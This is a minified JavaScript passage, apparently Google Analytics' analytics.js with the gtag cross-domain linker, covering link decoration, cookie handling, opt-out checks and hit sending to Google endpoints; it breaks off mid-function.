!(function () {
  var r,
    v,
    n = this || self,
    p = function (a, b) {
      a = a.split(".");
      var d,
        c = n;
      a[0] in c || void 0 === c.execScript || c.execScript("var " + a[0]);
      for (; a.length && (d = a.shift()); )
        a.length || void 0 === b
          ? (c = c[d] && c[d] !== Object.prototype[d] ? c[d] : (c[d] = {}))
          : (c[d] = b);
    };
  function q() {
    for (var a = r, b = {}, c = 0; c < a.length; ++c) b[a[c]] = c;
    return b;
  }
  function u() {
    var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    return (a += a.toLowerCase() + "0123456789-_") + ".";
  }
  function aa(a) {
    function b(k) {
      for (; d < a.length; ) {
        var m = a.charAt(d++),
          l = v[m];
        if (null != l) return l;
        if (!/^[\s\xa0]*$/.test(m))
          throw Error("Unknown base64 encoding at char: " + m);
      }
      return k;
    }
    (r = r || u()), (v = v || q());
    for (var c = "", d = 0; ; ) {
      var e = b(-1),
        f = b(0),
        h = b(64),
        g = b(64);
      if (64 === g && -1 === e) return c;
      (c += String.fromCharCode((e << 2) | (f >> 4))),
        64 != h &&
          ((c += String.fromCharCode(((f << 4) & 240) | (h >> 2))),
          64 != g && (c += String.fromCharCode(((h << 6) & 192) | g)));
    }
  }
  var w = {},
    y = function (a) {
      (w.TAGGING = w.TAGGING || []), (w.TAGGING[a] = !0);
    },
    ba = Array.isArray,
    z = function (a, b) {
      for (var c in b) b.hasOwnProperty(c) && (a[c] = b[c]);
    },
    A = function (a) {
      for (var b in a) if (a.hasOwnProperty(b)) return !0;
      return !1;
    },
    B = function (a) {
      this.j = a;
    };
  B.prototype.toString = function () {
    return this.j.toString();
  };
  var C = /^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i;
  new B("about:invalid#zClosurez"), new B("about:blank");
  var D = function () {
    this.i = "";
  };
  (D.prototype.toString = function () {
    return this.i.toString();
  }),
    new D();
  var E = function () {
    this.h = "";
  };
  (E.prototype.toString = function () {
    return this.h.toString();
  }),
    new E();
  var F = function () {
    this.g = (n.trustedTypes && n.trustedTypes.emptyHTML) || "";
  };
  (F.prototype.toString = function () {
    return this.g.toString();
  }),
    new F();
  var S,
    G = window,
    H = window.history,
    I = document,
    J = navigator,
    K = function () {
      var b = G.google_tag_data;
      return (G.google_tag_data = void 0 === b ? {} : b), G.google_tag_data;
    },
    L = function (a, b) {
      I.addEventListener
        ? I.addEventListener(a, b, !1)
        : I.attachEvent && I.attachEvent("on" + a, b);
    },
    da = function (a) {
      var b = M();
      b.pending || (b.pending = []),
        (function (a, b) {
          if (a && ba(a))
            for (var c = 0; c < a.length; c++) if (a[c] && b(a[c])) return a[c];
        })(b.pending, function (c) {
          return (
            c.target.ctid === a.ctid &&
            c.target.isDestination === a.isDestination
          );
        }) || b.pending.push({ target: a, onLoad: void 0 });
    },
    ea = function () {
      (this.container = {}),
        (this.destination = {}),
        (this.canonical = {}),
        (this.pending = []);
    },
    M = function () {
      var a = K(),
        b = a.tidr;
      return b || ((b = new ea()), (a.tidr = b)), b;
    },
    N = /:[0-9]+$/,
    Q = function (a, b) {
      return (
        b && (b = String(b).toLowerCase()),
        ("protocol" !== b && "port" !== b) ||
          (a.protocol = O(a.protocol) || O(G.location.protocol)),
        "port" === b
          ? (a.port = String(
              Number(a.hostname ? a.port : G.location.port) ||
                ("http" === a.protocol
                  ? 80
                  : "https" === a.protocol
                    ? 443
                    : ""),
            ))
          : "host" === b &&
            (a.hostname = (a.hostname || G.location.hostname)
              .replace(N, "")
              .toLowerCase()),
        P(a, b)
      );
    },
    P = function (a, b, c) {
      var d = O(a.protocol);
      switch ((b && (b = String(b).toLowerCase()), b)) {
        case "url_no_fragment":
          (c = ""),
            a &&
              a.href &&
              (c =
                0 > (c = a.href.indexOf("#")) ? a.href : a.href.substr(0, c)),
            (a = c);
          break;
        case "protocol":
          a = d;
          break;
        case "host":
          (a = a.hostname.replace(N, "").toLowerCase()),
            c &&
              (c = /^www\d*\./.exec(a)) &&
              c[0] &&
              (a = a.substr(c[0].length));
          break;
        case "port":
          a = String(
            Number(a.port) || ("http" === d ? 80 : "https" === d ? 443 : ""),
          );
          break;
        case "path":
          a.pathname || a.hostname || y(1),
            (a = (a =
              "/" === a.pathname.substr(0, 1)
                ? a.pathname
                : "/" + a.pathname).split("/")),
            0 <= [].indexOf(a[a.length - 1]) && (a[a.length - 1] = ""),
            (a = a.join("/"));
          break;
        case "query":
          a = a.search.replace("?", "");
          break;
        case "extension":
          a = (a =
            1 < (a = a.pathname.split(".")).length
              ? a[a.length - 1]
              : "").split("/")[0];
          break;
        case "fragment":
          a = a.hash.replace("#", "");
          break;
        default:
          a = a && a.href;
      }
      return a;
    },
    O = function (a) {
      return a ? a.replace(":", "").toLowerCase() : "";
    },
    R = function (a) {
      var b = I.createElement("a");
      a && (b.href = a);
      var c = b.pathname;
      return (
        "/" !== c[0] && (a || y(1), (c = "/" + c)),
        (a = b.hostname.replace(N, "")),
        {
          href: b.href,
          protocol: b.protocol,
          host: b.host,
          hostname: a,
          pathname: c,
          search: b.search,
          hash: b.hash,
          port: b.port,
        }
      );
    },
    U = function () {
      var a = fa,
        b = ha,
        c = T(),
        d = function (h) {
          a(h.target || h.srcElement || {});
        };
      if (!c.init) {
        L("mousedown", d),
          L("keyup", d),
          L("submit", function (h) {
            b(h.target || h.srcElement || {});
          });
        var f = HTMLFormElement.prototype.submit;
        (HTMLFormElement.prototype.submit = function () {
          b(this), f.call(this);
        }),
          (c.init = !0);
      }
    },
    ia = function (a, b, c, d, e) {
      (a = {
        callback: a,
        domains: b,
        fragment: 2 === c,
        placement: c,
        forms: d,
        sameHost: e,
      }),
        T().decorators.push(a);
    },
    V = function (a, b, c) {
      for (var d = T().decorators, e = {}, f = 0; f < d.length; ++f) {
        var g,
          h = d[f];
        if ((g = !c || h.forms))
          a: {
            g = h.domains;
            var k = a,
              m = !!h.sameHost;
            if (g && (m || k !== I.location.hostname))
              for (var l = 0; l < g.length; l++)
                if (g[l] instanceof RegExp) {
                  if (g[l].test(k)) {
                    g = !0;
                    break a;
                  }
                } else if (
                  0 <= k.indexOf(g[l]) ||
                  (m && 0 <= g[l].indexOf(k))
                ) {
                  g = !0;
                  break a;
                }
            g = !1;
          }
        g &&
          (null == (g = h.placement) && (g = h.fragment ? 2 : 1),
          g === b && z(e, h.callback()));
      }
      return e;
    };
  function T() {
    var a = K(),
      b = a.gl;
    return (b && b.decorators) || ((b = { decorators: [] }), (a.gl = b)), b;
  }
  var ja = /(.*?)\*(.*?)\*(.*)/,
    ka = /([^?#]+)(\?[^#]*)?(#.*)?/;
  function W(a) {
    return new RegExp("(.*?)(^|&)" + a + "=([^&]*)&?(.*)");
  }
  var X = function (a) {
    var c,
      b = [];
    for (c in a)
      if (a.hasOwnProperty(c)) {
        var d = a[c];
        if (
          void 0 !== d &&
          d == d &&
          null !== d &&
          "[object Object]" !== d.toString()
        ) {
          b.push(c);
          var e = b,
            f = e.push;
          (d = String(d)), (r = r || u()), (v = v || q());
          for (var h = [], g = 0; g < d.length; g += 3) {
            var k = g + 1 < d.length,
              m = g + 2 < d.length,
              l = d.charCodeAt(g),
              t = k ? d.charCodeAt(g + 1) : 0,
              x = m ? d.charCodeAt(g + 2) : 0,
              ra = l >> 2;
            (l = ((3 & l) << 4) | (t >> 4)),
              (t = ((15 & t) << 2) | (x >> 6)),
              (x &= 63),
              m || ((x = 64), k || (t = 64)),
              h.push(r[ra], r[l], r[t], r[x]);
          }
          f.call(e, h.join(""));
        }
      }
    return ["1", la((a = b.join("*"))), a].join("*");
  };
  function la(a, b) {
    if (
      ((a = [
        J.userAgent,
        new Date().getTimezoneOffset(),
        J.userLanguage || J.language,
        Math.floor(new Date(Date.now()).getTime() / 60 / 1e3) -
          (void 0 === b ? 0 : b),
        a,
      ].join("*")),
      !(b = S))
    ) {
      b = Array(256);
      for (var c = 0; 256 > c; c++) {
        for (var d = c, e = 0; 8 > e; e++)
          d = 1 & d ? (d >>> 1) ^ 3988292384 : d >>> 1;
        b[c] = d;
      }
    }
    for (S = b, b = 4294967295, c = 0; c < a.length; c++)
      b = (b >>> 8) ^ S[255 & (b ^ a.charCodeAt(c))];
    return ((-1 ^ b) >>> 0).toString(36);
  }
  function ma(a) {
    return function (b) {
      var c = R(G.location.href),
        d = c.search.replace("?", "");
      a: {
        for (var e = d.split("&"), f = 0; f < e.length; f++) {
          var h = e[f].split("=");
          if ("_gl" === decodeURIComponent(h[0]).replace(/\+/g, " ")) {
            e = h.slice(1).join("=");
            break a;
          }
        }
        e = void 0;
      }
      (b.query = na(e || "") || {}),
        (f = (e = Q(c, "fragment")).match(W("_gl"))),
        (b.fragment = na((f && f[3]) || "") || {}),
        a &&
          (function oa(a, b, c) {
            function d(f, h) {
              return (f = pa("_gl", f)).length && (f = h + f), f;
            }
            if (H && H.replaceState) {
              var e = W("_gl");
              (e.test(b) || e.test(c)) &&
                ((a = Q(a, "path")),
                (b = d(b, "?")),
                (c = d(c, "#")),
                H.replaceState({}, void 0, "" + a + b + c));
            }
          })(c, d, e);
    };
  }
  function pa(a, b) {
    if ((a = W(a).exec(b))) {
      var c = a[2],
        d = a[4];
      (b = a[1]), d && (b = b + c + d);
    }
    return b;
  }
  var na = function (a) {
    try {
      a: {
        if (a) {
          b: {
            for (var b = 0; 3 > b; ++b) {
              var c = ja.exec(a);
              if (c) {
                var d = c;
                break b;
              }
              a = decodeURIComponent(a);
            }
            d = void 0;
          }
          if (d && "1" === d[1]) {
            var e = d[2],
              f = d[3];
            b: {
              for (d = 0; 3 > d; ++d)
                if (e === la(f, d)) {
                  var h = !0;
                  break b;
                }
              h = !1;
            }
            if (h) {
              var g = f;
              break a;
            }
            y(7);
          }
        }
        g = void 0;
      }
      if (void 0 !== (e = g)) {
        g = {};
        var k = e ? e.split("*") : [];
        for (e = 0; e + 1 < k.length; e += 2) {
          var m = k[e],
            l = aa(k[e + 1]);
          g[m] = l;
        }
        return y(6), g;
      }
    } catch (t) {
      y(8);
    }
  };
  function Y(a, b, c, d) {
    function e(k) {
      var m = (k = pa(a, k)).charAt(k.length - 1);
      return k && "&" !== m && (k += "&"), k + g;
    }
    d = void 0 !== d && d;
    var f = ka.exec(c);
    if (!f) return "";
    c = f[1];
    var h = f[2] || "";
    f = f[3] || "";
    var g = a + "=" + b;
    return (
      d ? (f = "#" + e(f.substring(1))) : (h = "?" + e(h.substring(1))),
      "" + c + h + f
    );
  }
  function qa(a, b) {
    var c = "FORM" === (a.tagName || "").toUpperCase(),
      d = V(b, 1, c),
      e = V(b, 2, c);
    for (var f in ((b = V(b, 3, c)),
    A(d) && ((d = X(d)), c ? sa("_gl", d, a) : Z("_gl", d, a, !1)),
    !c && A(e) && Z("_gl", (c = X(e)), a, !0),
    b))
      b.hasOwnProperty(f) && ta(f, b[f], a);
  }
  function ta(a, b, c, d) {
    if (c.tagName) {
      if ("a" === c.tagName.toLowerCase()) return Z(a, b, c, d);
      if ("form" === c.tagName.toLowerCase()) return sa(a, b, c);
    }
    if ("string" == typeof c) return Y(a, b, c, d);
  }
  function Z(a, b, c, d) {
    c.href &&
      ((a = Y(a, b, c.href, void 0 !== d && d)), C.test(a) && (c.href = a));
  }
  function sa(a, b, c) {
    if (c && c.action) {
      var d = (c.method || "").toLowerCase();
      if ("get" === d) {
        d = c.childNodes || [];
        for (var e = !1, f = 0; f < d.length; f++) {
          var h = d[f];
          if (h.name === a) {
            h.setAttribute("value", b), (e = !0);
            break;
          }
        }
        e ||
          ((d = I.createElement("input")).setAttribute("type", "hidden"),
          d.setAttribute("name", a),
          d.setAttribute("value", b),
          c.appendChild(d));
      } else
        "post" === d && ((a = Y(a, b, c.action)), C.test(a) && (c.action = a));
    }
  }
  function fa(a) {
    try {
      a: {
        for (var b = 100; a && 0 < b; ) {
          if (a.href && a.nodeName.match(/^a(?:rea)?$/i)) {
            var c = a;
            break a;
          }
          (a = a.parentNode), b--;
        }
        c = null;
      }
      if (c) {
        var d = c.protocol;
        ("http:" !== d && "https:" !== d) || qa(c, c.hostname);
      }
    } catch (e) {}
  }
  function ha(a) {
    try {
      if (a.action) qa(a, Q(R(a.action), "host"));
    } catch (c) {}
  }
  p("google_tag_data.glBridge.auto", function (a, b, c, d) {
    U(), ia(a, b, "fragment" === c ? 2 : 1, !!d, !1);
  }),
    p("google_tag_data.glBridge.passthrough", function (a, b, c) {
      U(), ia(a, [P(G.location, "host", !0)], b, !!c, !0);
    }),
    p("google_tag_data.glBridge.decorate", function (a, b, c) {
      return ta("_gl", (a = X(a)), b, !!c);
    }),
    p("google_tag_data.glBridge.generate", X),
    p("google_tag_data.glBridge.get", function (a, b) {
      var c = ma(!!b);
      return (
        (b = T()).data || ((b.data = { query: {}, fragment: {} }), c(b.data)),
        (c = {}),
        (b = b.data) && (z(c, b.query), a && z(c, b.fragment)),
        c
      );
    }),
    p("google_tag_data.tcBridge.registerUa", function (a, b) {
      a = a + "_" + b;
      var c = M(),
        d = c.destination[a];
      d
        ? ((d.state = 2), (d.containers = []), (d.destinations = [b]))
        : (c.destination[a] = { state: 2, containers: [], destinations: [b] });
    }),
    p("google_tag_data.tcBridge.setSideload", function (a, b, c) {
      (a = { ctid: a + "_" + c, isDestination: !0 }),
        (M().container[b] = {
          state: 1,
          context: { source: 5, fromContainerExecution: !0 },
          parent: a,
        }),
        da({ ctid: b, isDestination: !1 });
    });
})(window),
  (function () {
    function La(a) {
      var c,
        b = 1;
      if (a)
        for (b = 0, c = a.length - 1; 0 <= c; c--) {
          var d = a.charCodeAt(c);
          b =
            0 != (d = 266338304 & (b = ((b << 6) & 268435455) + d + (d << 14)))
              ? b ^ (d >> 21)
              : b;
        }
      return b;
    }
    var $c = function (a) {
      this.C = a || [];
    };
    ($c.prototype.set = function (a) {
      this.C[a] = !0;
    }),
      ($c.prototype.get = function (a) {
        return this.C[a];
      }),
      ($c.prototype.encode = function () {
        for (var a = [], b = 0; b < this.C.length; b++)
          this.C[b] && (a[Math.floor(b / 6)] ^= 1 << b % 6);
        for (b = 0; b < a.length; b++)
          a[b] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".charAt(
              a[b] || 0,
            );
        return a.join("") + "~";
      });
    var wa,
      ya,
      ha = window.GoogleAnalyticsObject;
    if (
      ((wa = null != ha) && (wa = -1 < (ha.constructor + "").indexOf("String")),
      (ya = wa))
    ) {
      var fc = window.GoogleAnalyticsObject;
      ya = fc ? fc.replace(/^[\s\xa0]+|[\s\xa0]+$/g, "") : "";
    }
    var gb = ya || "ga",
      jd = /^(?:utma\.)?\d+\.\d+$/,
      kd = /^amp-[\w.-]{22,64}$/,
      Ba = !1,
      vd = new $c();
    function J(a) {
      vd.set(a);
    }
    var Td = function (a) {
        (a = Dd(a)), (a = new $c(a));
        for (var b = vd.C.slice(), c = 0; c < a.C.length; c++)
          b[c] = b[c] || a.C[c];
        return new $c(b).encode();
      },
      Dd = function (a) {
        return (a = a.get(Gd)), ka(a) || (a = []), a;
      },
      ea = function (a) {
        return "function" == typeof a;
      },
      ka = function (a) {
        return "[object Array]" == Object.prototype.toString.call(Object(a));
      },
      qa = function (a) {
        return null != a && -1 < (a.constructor + "").indexOf("String");
      },
      D = function (a, b) {
        return 0 == a.indexOf(b);
      },
      ra = function () {
        for (
          var a =
              O.navigator.userAgent +
              (M.cookie ? M.cookie : "") +
              (M.referrer ? M.referrer : ""),
            b = a.length,
            c = O.history.length;
          0 < c;

        )
          a += c-- ^ b++;
        return [
          hd() ^ (2147483647 & La(a)),
          Math.round(new Date().getTime() / 1e3),
        ].join(".");
      },
      ua = function () {},
      K = function (a) {
        return encodeURIComponent instanceof Function
          ? encodeURIComponent(a)
          : (J(28), a);
      },
      L = function (a, b, c, d) {
        try {
          a.addEventListener
            ? a.addEventListener(b, c, !!d)
            : a.attachEvent && a.attachEvent("on" + b, c);
        } catch (e) {
          J(27);
        }
      },
      f = /^[\w\-:/.?=&%!\[\]]+$/,
      Nd = /^[\w+/_-]+[=]{0,2}$/,
      ff = null,
      Id = function (a, b, c, d, e) {
        if (!ff) {
          ff = {
            createScriptURL: function (ca) {
              return ca;
            },
            createHTML: function (ca) {
              return ca;
            },
          };
          try {
            ff = window.trustedTypes.createPolicy("google-analytics", ff);
          } catch (ca) {}
        }
        if (a) {
          var g = (M.querySelector && M.querySelector("script[nonce]")) || null;
          (g =
            (g && (g.nonce || (g.getAttribute && g.getAttribute("nonce")))) ||
            ""),
            c
              ? ((e = d = ""),
                b && f.test(b) && (d = ' id="' + b + '"'),
                g && Nd.test(g) && (e = ' nonce="' + g + '"'),
                f.test(a) &&
                  M.write(
                    ff.createHTML(
                      "<script" + d + e + ' src="' + a + '"></script>',
                    ),
                  ))
              : (((c = M.createElement("script")).type = "text/javascript"),
                (c.async = !0),
                (c.src = ff.createScriptURL(a)),
                d && (c.onload = d),
                e && (c.onerror = e),
                b && (c.id = b),
                g && c.setAttribute("nonce", g),
                (a =
                  M.getElementsByTagName("script")[0]).parentNode.insertBefore(
                  c,
                  a,
                ));
        }
      },
      be = function (a, b) {
        return E(M.location[b ? "href" : "search"], a);
      },
      E = function (a, b) {
        return (a = a.match(
          "(?:&|#|\\?)" +
            K(b).replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1") +
            "=([^&#]*)",
        )) && 2 == a.length
          ? a[1]
          : "";
      },
      xa = function () {
        var a = "" + M.location.hostname;
        return 0 == a.indexOf("www.") ? a.substring(4) : a;
      },
      de = function (a, b) {
        var c = a.indexOf(b);
        return (
          (5 == c || 6 == c) &&
          ("/" == (a = a.charAt(c + b.length)) ||
            "?" == a ||
            "" == a ||
            ":" == a)
        );
      },
      of = function (a, b) {
        var c = M.referrer;
        if (/^(https?|android-app):\/\//i.test(c)) {
          if (a) return c;
          if (((a = "//" + M.location.hostname), !de(c, a)))
            return b &&
              ((b = a.replace(/\./g, "-") + ".cdn.ampproject.org"), de(c, b))
              ? void 0
              : c;
        }
      },
      za = function (a, b) {
        if (1 == b.length && null != b[0] && "object" == typeof b[0])
          return b[0];
        for (
          var c = {}, d = Math.min(a.length + 1, b.length), e = 0;
          e < d;
          e++
        ) {
          if ("object" == typeof b[e]) {
            for (var g in b[e]) b[e].hasOwnProperty(g) && (c[g] = b[e][g]);
            break;
          }
          e < a.length && (c[a[e]] = b[e]);
        }
        return c;
      },
      Ee = function (a, b) {
        for (var c = 0; c < a.length; c++) if (b == a[c]) return !0;
        return !1;
      },
      ee = function () {
        (this.oa = []), (this.ea = {}), (this.m = {});
      };
    (ee.prototype.set = function (a, b, c) {
      this.oa.push(a), c ? (this.m[":" + a] = b) : (this.ea[":" + a] = b);
    }),
      (ee.prototype.get = function (a) {
        return this.m.hasOwnProperty(":" + a)
          ? this.m[":" + a]
          : this.ea[":" + a];
      }),
      (ee.prototype.map = function (a) {
        for (var b = 0; b < this.oa.length; b++) {
          var c = this.oa[b],
            d = this.get(c);
          d && a(c, d);
        }
      });
    var O = window,
      M = document,
      jf = document.currentScript ? document.currentScript.src : "",
      va = function (a, b) {
        return setTimeout(a, b);
      },
      Qa = window,
      Za = document,
      G = function (a) {
        var b = Qa._gaUserPrefs;
        if (
          (b && b.ioo && b.ioo()) ||
          Za.documentElement.hasAttribute("data-google-analytics-opt-out") ||
          (a && !0 === Qa["ga-disable-" + a])
        )
          return !0;
        try {
          var c = Qa.external;
          if (c && c._gaUserPrefs && "oo" == c._gaUserPrefs) return !0;
        } catch (g) {}
        for (
          a = [], b = String(Za.cookie).split(";"), c = 0;
          c < b.length;
          c++
        ) {
          var d = b[c].split("="),
            e = d[0].replace(/^\s*|\s*$/g, "");
          e &&
            "AMP_TOKEN" == e &&
            ((d = d
              .slice(1)
              .join("=")
              .replace(/^\s*|\s*$/g, "")) && (d = decodeURIComponent(d)),
            a.push(d));
        }
        for (b = 0; b < a.length; b++) if ("$OPT_OUT" == a[b]) return !0;
        return !!Za.getElementById("__gaOptOutExtension");
      },
      Ca = function (a) {
        var b = [],
          c = M.cookie.split(";");
        a = new RegExp("^\\s*" + a + "=\\s*(.*?)\\s*$");
        for (var d = 0; d < c.length; d++) {
          var e = c[d].match(a);
          e && b.push(e[1]);
        }
        return b;
      },
      zc = function (a, b, c, d, e, g, ca) {
        if (
          !(e =
            !G(e) &&
            !(eb.test(M.location.hostname) || ("/" == c && vc.test(d))))
        )
          return !1;
        if (
          (b && 1200 < b.length && (b = b.substring(0, 1200)),
          (c = a + "=" + b + "; path=" + c + "; "),
          g &&
            (c +=
              "expires=" +
              new Date(new Date().getTime() + g).toGMTString() +
              "; "),
          d && "none" !== d && (c += "domain=" + d + ";"),
          ca && (c += ca + ";"),
          (d = M.cookie),
          (M.cookie = c),
          !(d = d != M.cookie))
        )
          a: {
            for (a = Ca(a), d = 0; d < a.length; d++)
              if (b == a[d]) {
                d = !0;
                break a;
              }
            d = !1;
          }
        return d;
      },
      Cc = function (a) {
        return encodeURIComponent
          ? encodeURIComponent(a).replace(/\(/g, "%28").replace(/\)/g, "%29")
          : a;
      },
      vc = /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/,
      eb = /(^|\.)doubleclick\.net$/i,
      Oe = function (a) {
        var b = [],
          c = M.cookie.split(";");
        a = new RegExp(
          "^\\s*" + (a || "_gac") + "_(UA-\\d+-\\d+)=\\s*(.+?)\\s*$",
        );
        for (var d = 0; d < c.length; d++) {
          var e = c[d].match(a);
          e &&
            b.push({
              ja: e[1],
              value: e[2],
              timestamp: Number(e[2].split(".")[1]) || 0,
            });
        }
        return (
          b.sort(function (g, ca) {
            return ca.timestamp - g.timestamp;
          }),
          b
        );
      };
    function df(a, b, c) {
      var d = {};
      if (!(b = Oe(b)) || !b.length) return d;
      for (var e = 0; e < b.length; e++) {
        var g = b[e].value.split(".");
        if ("1" !== g[0] || (c && 3 > g.length) || (!c && 3 !== g.length))
          a && (a.na = !0);
        else if (Number(g[1])) {
          d[b[e].ja] ? a && (a.pa = !0) : (d[b[e].ja] = []);
          var ca = { version: g[0], timestamp: 1e3 * Number(g[1]), qa: g[2] };
          c && 3 < g.length && (ca.labels = g.slice(3)), d[b[e].ja].push(ca);
        }
      }
      return d;
    }
    var Fa,
      Ga,
      fb,
      Ab,
      ja = /^https?:\/\/[^/]*cdn\.ampproject\.org\//,
      Ue = /^(?:www\.|m\.|amp\.)+/,
      Ub = [],
      ic = function () {
        Z.D([ua]);
      },
      tc = function (a, b) {
        var c = Ca("AMP_TOKEN");
        return 1 < c.length
          ? (J(55), !1)
          : "$OPT_OUT" == (c = decodeURIComponent(c[0] || "")) ||
              "$ERROR" == c ||
              G(b)
            ? (J(62), !1)
            : ja.test(M.referrer) || "$NOT_FOUND" != c
              ? void 0 !== Ab
                ? (J(56),
                  va(function () {
                    a(Ab);
                  }, 0),
                  !0)
                : Fa
                  ? (Ub.push(a), !0)
                  : "$RETRIEVING" == c
                    ? (J(57),
                      va(function () {
                        tc(a, b);
                      }, 1e4),
                      !0)
                    : ((Fa = !0),
                      (c && "$" != c[0]) ||
                        (xc("$RETRIEVING", 3e4), setTimeout(Mc, 3e4), (c = "")),
                      !!Pc(c, b) && (Ub.push(a), !0))
              : (J(68), !1);
      },
      Pc = function (a, b, c) {
        if (!window.JSON) return J(58), !1;
        var d = O.XMLHttpRequest;
        if (!d) return J(59), !1;
        var e = new d();
        return "withCredentials" in e
          ? (e.open(
              "POST",
              (c || "https://ampcid.google.com/v1/publisher:getClientId") +
                "?key=AIzaSyA65lEHUEizIsNtlbNo-l2K18dT680nsaM",
              !0,
            ),
            (e.withCredentials = !0),
            e.setRequestHeader("Content-Type", "text/plain"),
            (e.onload = function () {
              if (((Fa = !1), 4 == e.readyState)) {
                try {
                  200 != e.status && (J(61), Qc("", "$ERROR", 3e4));
                  var g = JSON.parse(e.responseText);
                  g.optOut
                    ? (J(63), Qc("", "$OPT_OUT", 31536e6))
                    : g.clientId
                      ? Qc(g.clientId, g.securityToken, 31536e6)
                      : !c && g.alternateUrl
                        ? (Ga && clearTimeout(Ga),
                          (Fa = !0),
                          Pc(a, b, g.alternateUrl))
                        : (J(64), Qc("", "$NOT_FOUND", 36e5));
                } catch (ca) {
                  J(65), Qc("", "$ERROR", 3e4);
                }
                e = null;
              }
            }),
            (d = { originScope: "AMP_ECID_GOOGLE" }),
            a && (d.securityToken = a),
            e.send(JSON.stringify(d)),
            (Ga = va(function () {
              J(66), Qc("", "$ERROR", 3e4);
            }, 1e4)),
            !0)
          : (J(60), !1);
      },
      Mc = function () {
        Fa = !1;
      },
      xc = function (a, b) {
        if (void 0 === fb) {
          fb = "";
          for (var c = id(), d = 0; d < c.length; d++) {
            var e = c[d];
            if (zc("AMP_TOKEN", encodeURIComponent(a), "/", e, "", b))
              return void (fb = e);
          }
        }
        zc("AMP_TOKEN", encodeURIComponent(a), "/", fb, "", b);
      },
      Qc = function (a, b, c) {
        for (
          Ga && clearTimeout(Ga), b && xc(b, c), Ab = a, b = Ub, Ub = [], c = 0;
          c < b.length;
          c++
        )
          b[c](a);
      },
      ye = function (a) {
        a: {
          if (ja.test(M.referrer)) {
            var b = M.location.hostname.replace(Ue, "");
            b: {
              var c = M.referrer,
                d = (c = c.replace(/^https?:\/\//, ""))
                  .replace(/^[^/]+/, "")
                  .split("/"),
                e = d[2];
              if (
                !(d = (d = "s" == e ? d[3] : e) ? decodeURIComponent(d) : d)
              ) {
                if (0 == c.indexOf("xn--")) {
                  c = "";
                  break b;
                }
                (c = c.match(/(.*)\.cdn\.ampproject\.org\/?$/)) &&
                  2 == c.length &&
                  (d = c[1].replace(/-/g, ".").replace(/\.\./g, "-"));
              }
              c = d ? d.replace(Ue, "") : "";
            }
            if (
              ((d = b === c) ||
                ((c = "." + c),
                (d = b.substring(b.length - c.length, b.length) === c)),
              d)
            ) {
              b = !0;
              break a;
            }
            J(78);
          }
          b = !1;
        }
        return b && !1 !== a;
      },
      bd = function (a) {
        return (
          (a || Ba || "https:" == M.location.protocol ? "https:" : "http:") +
          "//www.google-analytics.com"
        );
      },
      Ge = function (a) {
        switch (a) {
          default:
          case 1:
            return "https://www.google-analytics.com/gtm/js?id=";
          case 2:
            return "https://www.googletagmanager.com/gtag/js?id=";
        }
      },
      Da = function (a) {
        (this.name = "len"), (this.message = a + "-8192");
      },
      ba = function (a, b, c) {
        if (((c = c || ua), 2036 >= b.length)) wc(a, b, c);
        else {
          if (!(8192 >= b.length))
            throw (ge("len", b.length), new Da(b.length));
          x(a, b, c) || wd(a, b, c) || wc(a, b, c);
        }
      },
      pe = function (a, b, c, d) {
        wd(a + "?" + b, "", (d = d || ua), c);
      },
      wc = function (a, b, c) {
        var d = (function (a) {
          var b = M.createElement("img");
          return (b.width = 1), (b.height = 1), (b.src = a), b;
        })(a + "?" + b);
        d.onload = d.onerror = function () {
          (d.onload = null), (d.onerror = null), c();
        };
      },
      wd = function (a, b, c, d) {
        var e = O.XMLHttpRequest;
        if (!e) return !1;
        var g = new e();
        return (
          "withCredentials" in g &&
          ((a = a.replace(/^http:/, "https:")),
          g.open("POST", a, !0),
          (g.withCredentials = !0),
          g.setRequestHeader("Content-Type", "text/plain"),
          (g.onreadystatechange = function () {
            if (4 == g.readyState) {
              if (d && "text/plain" === g.getResponseHeader("Content-Type"))
                try {
                  Ea(d, g.responseText, c);
                } catch (ca) {
                  ge("xhr", "rsp"), c();
                }
              else c();
              g = null;
            }
          }),
          g.send(b),
          !0)
        );
      },
      Ea = function (a, b, c) {
        if (1 > b.length) ge("xhr", "ver", "0"), c();
        else if (3 < a.count++) ge("xhr", "tmr", "" + a.count), c();
        else {
          var d = b.charAt(0);
          if ("1" === d) oc(a, b.substring(1), c);
          else if (a.V && "2" === d) {
            var e = b.substring(1).split(","),
              g = 0;
            for (
              b = function () {
                ++g === e.length && c();
              },
                d = 0;
              d < e.length;
              d++
            )
              oc(a, e[d], b);
          } else ge("xhr", "ver", String(b.length)), c();
        }
      },
      oc = function (a, b, c) {
        if (0 === b.length) c();
        else {
          var d = b.charAt(0);
          switch (d) {
            case "d":
              pe("https://stats.g.doubleclick.net/j/collect", a.U, a, c);
              break;
            case "g":
              wc("https://www.google.com/ads/ga-audiences", a.google, c),
                (b = b.substring(1)) &&
                  (/^[a-z.]{1,6}$/.test(b)
                    ? wc(
                        "https://www.google.%/ads/ga-audiences".replace("%", b),
                        a.google,
                        ua,
                      )
                    : ge("tld", "bcc", b));
              break;
            case "G":
              if (a.V) {
                a.V("G-" + b.substring(1)), c();
                break;
              }
            case "x":
              if (a.V) {
                a.V(), c();
                break;
              }
            case "c":
              if (a.V) {
                a.V(b.substring(1)), c();
                break;
              }
            default:
              ge("xhr", "brc", d), c();
          }
        }
      },
      x = function (a, b, c) {
        return (
          !!O.navigator.sendBeacon &&
          !!O.navigator.sendBeacon(a, b) &&
          (c(), !0)
        );
      },
      ge = function (a, b, c) {
        1 <= 100 * Math.random() ||
          G("?") ||
          ((a = ["t=error", "_e=" + a, "_v=j101", "sr=1"]),
          b && a.push("_f=" + b),
          c && a.push("_m=" + K(c.substring(0, 100))),
          a.push("aip=1"),
          a.push("z=" + hd()),
          wc(bd(!0) + "/u/d", a.join("&"), ua));
      },
      qc = function () {
        return (O.gaData = O.gaData || {});
      },
      h = function (a) {
        var b = qc();
        return (b[a] = b[a] || {});
      },
      Ha = function () {
        this.M = [];
      };
    function Ja(a) {
      if (100 != a.get(Ka) && La(P(a, Q)) % 1e4 >= 100 * R(a, Ka))
        throw "abort";
    }
    function Ma(a) {
      if (G(P(a, Na))) throw "abort";
    }
    function Oa() {
      var a = M.location.protocol;
      if ("http:" != a && "https:" != a) throw "abort";
    }
    function Pa(a) {
      try {
        O.navigator.sendBeacon
